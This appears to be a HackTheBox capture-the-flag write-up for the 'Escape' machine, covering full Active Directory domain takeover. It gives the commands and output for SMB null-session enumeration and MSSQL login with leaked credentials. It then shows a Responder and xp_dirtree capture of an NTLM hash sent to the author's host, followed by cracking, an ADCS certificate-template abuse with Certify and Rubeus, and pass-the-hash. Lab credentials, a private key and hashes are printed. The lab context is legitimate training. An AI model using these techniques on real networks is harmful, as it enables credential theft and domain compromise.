
```
Machine: Escape
Difficult: Medium
Platform: HackTheBox
Release: Released on 04/22/2023
```




### Recon:

Before starting the exploitation phase, it is crucial to understand what we are dealing with. Remember that a proper enumeration ensures effective exploitation.

First and foremost, we need to consider that machines expose their services through ports, so it is essential to identify which ports are available (open) on the target machine.

To accomplish this, we will employ the Nmap tool:

```
elswix@parrot$ nmap -p- --open -sS --min-rate 5000 -v -n -Pn 10.10.11.202 -oG portScan
```

I will provide a brief explanation of the purpose of each parameter you specified:

"-p-" -> We instruct the tool to perform a scan of all ports, from port 1 to 65535.

"--open" -> We specify that we want to filter by ports that are in the "open" state, as there are different states that are not entirely relevant.

"-sS" -> We indicate that we want to use the "TCP SYN Scan" scanning mode. This parameter helps to expedite the scan and reduce noise.

"--min-rate 5000" -> We specify the desired packet processing rate per second, in this case, "5000".

"-v" -> We indicate that we want to use verbose mode, which allows us to see the open ports as they are discovered during the scan. This helps us to streamline the process.

"-n" -> We indicate that we do not want to apply DNS resolution.

"-Pn" -> We indicate that we do not want to apply Host Discovery.

"-oG" -> We specify that we want to export the scan results in a grepable format, which allows us to filter out the most relevant information using regular expressions.

Scan result:

```
Completed SYN Stealth Scan at 09:01, 26.70s elapsed (65535 total ports)
Nmap scan report for 10.10.11.202
Host is up (0.17s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49687/tcp open  unknown
49688/tcp open  unknown
49708/tcp open  unknown
49712/tcp open  unknown
60035/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.82 seconds
           Raw packets sent: 131064 (5.767MB) | Rcvd: 34 (1.496KB)
```


As we can see, there is a large number of open ports. For this reason, we used the grepable format. The idea is to format the information by filtering only the ports separated by commas. Then, we will conduct a thorough scan to identify the technologies, services, and versions associated with specific ports.

To accomplish this, we will create a regular expression to filter the information from the grepable format file:

```
elswix@parrot$ cat portScan | grep 'Host: ' | grep -oP '\d{1,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',' 

53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49708,49712,60035
```


Once we have represented the ports in the desired format, we will proceed with the scan to identify the technologies, services, and versions running on those ports.

```
elswix@parrot$ nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49708,49712,60035 10.10.11.202 -oN fullScan
```


```
Nmap scan report for sequel.htb (10.10.11.202)
Host is up (0.34s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-25 21:22:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-25T21:24:23+00:00; +8h15m15s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-06-25T21:24:22+00:00; +8h15m15s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-06-25T21:24:23+00:00; +8h15m15s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-06-25T21:07:47
|_Not valid after:  2053-06-25T21:07:47
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-06-25T21:24:23+00:00; +8h15m15s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-25T21:24:24+00:00; +8h15m15s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
60035/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-06-25T21:23:44
|_  start_date: N/A
|_clock-skew: mean: 8h15m14s, deviation: 0s, median: 8h15m14s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.87 seconds
```



After inspecting the scan results, it appears that we are dealing with a domain controller, specifically an Active Directory environment on Windows.

At first glance, we can already identify a domain that I will immediately add to the `/etc/hosts` file.

```
elswix@parrot$ cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  Parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters

# HackTheBox
10.10.11.202 sequel.htb dc.sequel.htb dc
```



### SMB - TCP 445


The port 445 corresponds to the SMB service. We will start performing reconnaissance on the machine using this service. For this purpose, I will initially use the tool [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec).

```
elswix@parrot$ crackmapexec smb 10.10.11.202
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

We already obtained the relevant information we were looking for, which was the domain.

The SMB service sometimes exposes shared resources on the network. Accessing these resources typically requires the use of valid credentials. However, there are cases where a guest session (Null Session) can be used.

A guest or null session is a type of authentication where no password is required for access. Only a username needs to be provided. It's important to note that this doesn't always work, but it's good practice to give it a try nonetheless.

I will use the tool [smbmap](https://github.com/ShawnDEvans/smbmap) to scan the shared resources using a guest session.

```
elswix@parrot$ smbmap -H 10.10.11.202 -u 'test'
[+] Guest session   	IP: 10.10.11.202:445	Name: sequel.htb

Disk      	Permissions	  Comment
----      	-----------    -------
ADMIN$     	NO ACCESS	   Remote Admin
C$         	NO ACCESS      Default share
IPC$       	READ ONLY	   Remote IPC
NETLOGON   	NO ACCESS      Logon server share 
Public     	READ ONLY	
SYSVOL     	NO ACCESS      Logon server share 

```

We observe that there is a resource called "public" in which we have read privileges. Let's try listing its contents.

```
elswix@parrot$ smbmap -H 10.10.11.202 -u 'test' -r 'Public'
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/1.png?raw=true)


 We have identified a PDF file within the directory. We will proceed to download it and perform an inspection to analyze its content.

```
elswix@parrot$ smbmap -H 10.10.11.202 -u 'test' -r 'Public' --download "Public/SQL Server Procedures.pdf"

[+] Starting download: Public\SQL Server Procedures.pdf (49551 bytes)
[+] File output to: ./10.10.11.202-Public_SQL Server Procedures.pdf
```

We can open the web browser and enter the absolute path of the file on our system to view its content.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/2.png?raw=true)


Upon reading the file, we notice that on the second page, at the end, there is relevant information.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/3.png?raw=true)


It appears that credentials are being leaked. I will save them in a file and attempt to authenticate to the SMB service using these credentials.

```
PublicUser:GuestUserCantWrite1
```


We can verify if the credentials are correct using the tool [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec).

```
crackmapexec smb 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1'
```


![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/4.png?raw=true)


It appears that the credentials are not valid for the SMB service. However, since the PDF mentioned that they were for accessing the database, I will attempt to use the `mssqlclient` tool from [Impacket](https://github.com/SecureAuthCorp/impacket) to connect.

I will try again with the same credentials:

```
elswix@parrot$ mssqlclient.py "sequel.htb/PublicUser@10.10.11.202"
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password: 
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```


At this point, I attempted to use `xp_cmdshell` to execute commands but was not successful. I came up with the idea of trying to make an SMB request to a server hosted on my machine to obtain the Net-NTLMv2 hash of the MSSQL server's administrator user.

It's important to note that even though we are using the `PublicUser` account, the network-level request will be made by the MSSQL server administrator. Therefore, when executing `xp_dirtree` on my IP address, the request will be made by a different user than ours.

To redirect the request to my server, I will carry out an SMB service poisoning technique with `responder`:

```
elswix@parrot$ responder -I tun0

                                        __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-AFNXB8Z9RCY]
    Responder Domain Name      [GMQ6.LOCAL]
    Responder DCE-RPC Port     [46170]

[+] Listening for events...
```


I am going to execute the following command in the interactive console obtained with `mssqlclient`:

```
SQL> xp_dirtree "\\10.10.16.4\test"
```

  
We will wait a few seconds, and if everything goes well, the response server should have captured the request.

```
[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:0b63b108f4a834f8:8545469C3917EA7AF1954B38B72246F0:010100000000000000D0F5034AA7D901954F07D92C966FAF00000000020008003200370038005A0001001E00570049004E002D00440037003100360030005A004D00590047004500300004003400570049004E002D00440037003100360030005A004D0059004700450030002E003200370038005A002E004C004F00430041004C00030014003200370038005A002E004C004F00430041004C00050014003200370038005A002E004C004F00430041004C000700080000D0F5034AA7D90106000400020000000800300030000000000000000000000000300000D94D6229FBB3E411964E8C154976D855F2D964620B4B3CE73032483DFA79F67B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
```

We have successfully obtained the Net-NTLMv2 hash of the user `sql_svc`. Now, the idea is to store it in a file and perform a brute-force attack to try to obtain the plaintext password.

```
elswix@parrot$ john -w:/usr/share/wordlists/rockyou.txt file
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:19 DONE (2023-06-25 09:50) 0.05068g/s 542361p/s 542361c/s 542361C/s RENZOJAVIER..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Perfect, we have obtained the password in a readable format, and now we can attempt to use it to authenticate via SMB.

```
User: sql_svc
Password: REGGIE1234ronnie
```

Once again, we will use the tool [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec).

```
crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/5.png?raw=true)

We can verify if the user `sql_svc` belongs to the "Remote Management Users" group, so that we can connect to the Windows Remote Management service using tools like `Evil-WinRM`.

```
crackmapexec winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/6.png?raw=true)

Since the credentials are valid and the user `sql_svc` belongs to the "Remote Management Users" group, we can attempt to connect to the WinRM service using the tool `Evil-WinRM`. This will allow us to obtain an interactive console as the user `sql_svc`.

```
elswix@parrot$ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'

*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

We successfully accessed the system.


#### Shell as Ryan.Cooper:

While enumerating the system, we discovered a folder named "SQLServer" in the root directory of the system.

```
*Evil-WinRM* PS C:\> ls 


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows
```

By listing the contents of the folder, we can see that there is a subfolder named "Logs." Inside this folder, we found a file called "ERRORLOG.BAK."

```
*Evil-WinRM* PS C:\SQLServer\Logs> ls


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLServer\Logs> 
```


  
Upon examining the content of the "ERRORLOG.BAK" file, we can see that it stores error logs that have occurred on the SQL server. Furthermore, we can notice that someone has attempted to authenticate with the username "Ryan.Cooper."

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/7.png?raw=true)

  
Also, a few lines below, we can see that there have been authentication attempts with the username "NuclearMosquito3." The username is somewhat suspicious. I decided to try authenticating to the SMB service using the username "Ryan.Cooper" and used "NuclearMosquito3" as the password.

```
crackmapexec smb 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/8.png?raw=true)

The credentials are correct, and the user "Ryan.Cooper" also has access to the WinRM service. Therefore, using the Evil-WinRM tool again, we can attempt to connect.

```
elswix@parrot$ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```


### Shell as Administrator

We have identified the ADCS (Active Directory Certificate Services) service. It is always important to investigate Active Directory Certificate Services in a domain. We can try to do so using the tool `crackmapexec`.

It is worth noting that I had some issues with OpenSSL to run this reconnaissance mode, so I had to install a customized version of crackmapexec along with a Python virtual environment.

```
crackmapexec ldap 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/10.png?raw=true)


Once we know that ADCS is operational, we need to identify if there are any insecure configurations in any of the templates. To do this, we will make use of `Certify.exe`. I obtained this executable file from the SharpCollection repository on GitHub.

Specifically, I used the version found in the [NetFramework_4.5_Any](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_Any) folder.

The idea is to upload the executable file to the victim machine. For this, we can use the "upload" function of Evil-WinRM.

```
upload /home/elswix/Desktop/elswix/HTB/Escape/content/Certify.exe
```

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> upload /home/elswix/Desktop/elswix/HTB/Escape/content/Certify.exe

Info: Uploading Certify.exe to C:\Windows\Temp\Privesc\Certify.exe

Data: 236200 bytes of 236200 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```

  
Now we need to search for vulnerable templates, which we can do as follows:

```
./Certify.exe find /vulnerable /currentuser
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/11.png?raw=true)

We can see that a vulnerable template called "UserAuthentication" has been found.

With this information, we can execute the following command using `Certify.exe` and passing certain parameters:

```
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator 
```

In this command, we are essentially requesting a certificate based on the username we want to impersonate.

We save the keys returned by the command according to their type. That is, the private key is saved in a .key file, while the public key, which is actually a certificate, is saved in a .pem file.

```
elswix@parrot$ cat private.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4p7W/UJGTpymQtvqptr7MCrinEfitT2MRnvcKdOzE7BWAV84
WwxdkWuYQCEe5lbgnyxlCNDd5DjIvS57KANnpjQHWSjxN2ORQGqegerXCCx66L8J
5D7ZNipMZ01tE6VioKbNMea5fvGLYgB1/L9maiaKJetPaz4+RrsFXSvbN1ZQ0eqm
y0P2kljCstUGwRO6oFyQFqYp742/DsDEknqSlnQSZ3aTCB6YKa+R3/+W4T+ZmoPG
0v891XbNfywaHBX9DYGudzDWl5HHqAJmwRWHaTaVhzB74k+UJlOHiTzBqFSQT18G
paoUo/QcPxnNHq50GFG/+abr8RH49Sqc58gu5QIDAQABAoIBAAibUbzynGr15haZ
9ZJ6tJmCt3KKBGEvwjkXESiBgsaXptyMej5y/Ma+GF0vJNZIrGU/MWMhU5wMUAtn
TYQahQA576GCPY8F+AlDQ1vZyGrmDZDzWHPTszosZxRxS1g4qsNBMn/XrGnW0J1b
OR/tQP19EzgXdL+08HaNOcntFXlHeqSm8RZl0pvBLRYd1WFvKkUKW21v5mkz51FG
sEfBSdH7cZ7kWuHoGtHgfTFnCnyYHhUCKzUflM4W0T79TZM6C8v5VGF6e6wlmTyV
Gn0PddOmRphQJ+KqqIHUJxL388FmDa39dng38uXs77vclZ0qyA8NjxyISgCJ6qDB
//8F0E0CgYEA8SYmGb5hc/RT61Q5swgmuwjKYTn4wWUAyTOq0+4IqQH7R1wRRIn+
fnwYtQeBWxw4/EB0G+91lUgEYxUQzIPNZph0Pesw8USdZrfXUKSVpVRVAaQMqXfK
4k8tqqziYtCfEJGC05JQqgFYEQE9tpt3IYSztFo96ZDMWJslpGi28acCgYEA8JOj
3uLTzTqVKObKsOEVwir/QvB+hfJL53AeURKKpAYYxQtl8mmot3SuGaSHS7/SMXJP
AKNGz8XzqreZ20VsYMQiE5aBKnqguFgeBE0NHH2TE3d6m+wo1FlKl1HpKIAZJ7IE
eG5UrF7zF5rOQbx23LmBpCTEzTgQo+HSs3retJMCgYEAjTj2HyVrFOkFLE/K6pnf
dLEVNBMrJrbr2uizJiHEWJWcfpHgWu8lZxVtsraOfrjsdm2YkbOOfLoMN6piiCK3
61lk2c4ef2zbcQhAxC1epc/ZaHiWIbjRy+7qo4VTnuLmBGHy58xMCQN4e5zqc0Jg
ZfS8+OXQVDREN6/EP6BDYwkCgYEAuiYjSFVO+Z/4xns+HvsrMODAPvWDkPVYki4I
50ZnjF9DT0Rwj8/9wmZASIssPQqiA6ylQKMWKbLLxi7ml+nx4DYi//EW5N2Z+soD
/+P23zKzWP68GmXzecvVkZzJwpLL5BE0sFL+pZmak4svSWIgvs2zaGUi+oAFMCmO
NV4/cI0CgYBalqQDumy56mO4ff7h03wD5fwWOS+VfB8wAijmtR1g5FP7hY645JbA
8Bnx9vsNx4D89DBCn2VjleCGc0JagjsZhvotMjwVqFhA61kNCZ+7GEykoEAgdkoF
//06DTGg/NjyYWstCCe5DLst1nGQYyYfAU3uSQvAibj3BemZhu211w==
-----END RSA PRIVATE KEY-----
```

```
elswix@parrot$ cat cert.pem
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAApmSQbdZ0g+nQAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNjI1MjMxNjAzWhcNMjUwNjI1
MjMyNjAzWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDintb9QkZOnKZC2+qm2vswKuKc
R+K1PYxGe9wp07MTsFYBXzhbDF2Ra5hAIR7mVuCfLGUI0N3kOMi9LnsoA2emNAdZ
KPE3Y5FAap6B6tcILHrovwnkPtk2KkxnTW0TpWKgps0x5rl+8YtiAHX8v2ZqJool
609rPj5GuwVdK9s3VlDR6qbLQ/aSWMKy1QbBE7qgXJAWpinvjb8OwMSSepKWdBJn
dpMIHpgpr5Hf/5bhP5mag8bS/z3Vds1/LBocFf0Nga53MNaXkceoAmbBFYdpNpWH
MHviT5QmU4eJPMGoVJBPXwalqhSj9Bw/Gc0ernQYUb/5puvxEfj1KpznyC7lAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFPpbeu5bjpU/uMHIGIsWv2pTibBF
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAhw1QMnM+bOXjhslU/I2JLDcjrTKxlzkmONeHmQcj1ihl2Eo+4wblJbfj
3xaMu2pk5SxWWnl3qYz5lbg62rfJaQWf/UQqFZ5hU3piT4H075pOJb7V1MQGyx/W
NPB3Ya61DO7clWjiBgqBa9/6EeyunZq7wdyba4RCjFtszyOaWXRjEke50/s12ns8
i/7oWqLeFXKqFCbqvLZ/NmcCDQL81OeDkpzAqlXDOKV7ahNVKd7d0heTsaWU2NCp
1qdbN8hGE+4OZCQ64XOz/nFJpD6/oVmYEZEF3z8B9YKOTAW9uUo33wxHN5kTwjxi
WV6ij+c2FzHM+gDsMhFkpSP0AIXm7w==
-----END CERTIFICATE-----
```


With this information, we can execute the following command to obtain a similar result to the command executed with `Certify.exe`:

```
openssl pkcs12 -in cert.pem -inkey private.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

We have created a certificate without assigning any password, so it is unprotected.

Once done, we upload the cert.pfx file to the victim machine. Additionally, we also upload the binary file "Rubeus.exe," which you can find in the same repository as "Certify.exe."

```
upload /home/elswix/Desktop/elswix/HTB/Escape/content/cert.pfx
upload /home/elswix/Desktop/elswix/HTB/Escape/content/Rubeus.exe
```


On the victim machine, we run Rubeus, specifying the user we want to impersonate and the certificate we obtained:

```
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```


Finally, we obtain the NTLM hash of the Administrator user:

```
[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```


This type of hash can be used to perform a Pass-the-Hash attack, which means we can use the hash to authenticate without entering a password. Let's verify if it works with crackmapexec:

```
crackmapexec smb 10.10.11.202 -u 'Administrator' -H 'A52F78E4C751E5F5E17E1E9F3E58F4EE'
```

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/12.png?raw=true)

Since the user is Administrator, we can access the system using Evil-WinRM by directly passing the hash, which will allow us to access the system as this user.

```
elswix@parrot$ evil-winrm -i 10.10.11.202 -u 'Administrator' -H 'A52F78E4C751E5F5E17E1E9F3E58F4EE'

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
a45c9*******************d0007b5
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```




### Thank you for reading:

+  [Instagram](https://www.instagram.com/elswix_/)
+  [YouTube](https://www.youtube.com/@ElSwix)
+  [Twitter](https://twitter.com/elswix_)
+  [HackTheBox](https://app.hackthebox.com/profile/935172)


#### My Blog: 

+ [WebHackology - Pentesting & Web Development](https://webhackology.vercel.app/)
